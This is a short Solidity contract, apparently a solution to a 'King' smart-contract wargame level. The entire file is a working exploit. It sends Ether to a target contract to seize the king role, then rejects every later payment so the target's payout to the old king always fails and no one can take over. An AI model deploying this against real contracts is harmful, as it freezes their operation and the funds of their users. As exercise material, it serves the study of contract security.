// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

contract HackKing {
    bool init = false;

    function hack(address payable kingAddress) public payable {
        kingAddress.transfer(msg.value);
    }

    receive() external payable {
        require(!init);
        init = true;
    }
}